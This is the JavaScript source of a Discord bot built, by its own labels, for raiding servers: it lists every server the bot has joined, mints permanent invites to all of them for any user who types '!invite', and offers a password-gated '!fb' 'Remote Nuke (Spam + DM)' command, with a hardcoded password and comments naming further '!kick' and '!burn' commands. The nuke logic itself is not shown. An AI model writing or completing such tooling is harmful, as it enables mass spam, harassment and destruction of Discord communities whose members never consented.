const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
  ChannelType
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORD
const MAIN_PASSWORD = 'flower2017';

// EXPRESS
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000);

// CONFIG
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// READY
client.once('ready', () => {
  console.log(`${client.user.tag} is online`);
});

// MESSAGE EVENTS
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // !servers
  if (content === '!servers') {
    const guilds = client.guilds.cache;
    let text = `**Servers (${guilds.size}):**\n\n`;
    guilds.forEach(g => text += `**${g.name}** (ID: \`${g.id}\`) - ${g.memberCount} members\n`);
    message.reply(text.length > 2000 ? 'List too long. Check console.' : text);
    return;
  }

  // !invite
  if (content === '!invite') {
    let text = '**Server Invites:**\n\n';
    for (const guild of client.guilds.cache.values()) {
      try {
        const invite = await guild.channels.cache.filter(c => c.type === 0).first()?.createInvite({ maxAge: 0 }) || 'No permission';
        text += `**${guild.name}** → https://discord.gg/${invite.code}\n`;
      } catch (e) {
        text += `**${guild.name}** → No permission\n`;
      }
    }
    message.reply(text);
    return;
  }

  // !fb - Remote Nuke (Spam + DM)
  if (content === '!fb') {
    const embed = new EmbedBuilder()
      .setColor('#ff0000')
      .setTitle('🔴 REMOTE NUKE')
      .setDescription('Enter password, then choose server.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`fb_start_${message.author.id}`).setLabel('Enter Password').setStyle(ButtonStyle.Danger)
    );

    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // Add other commands here if needed (!kick, !4clout, !burn, etc.)
});

client.login(TOKEN);
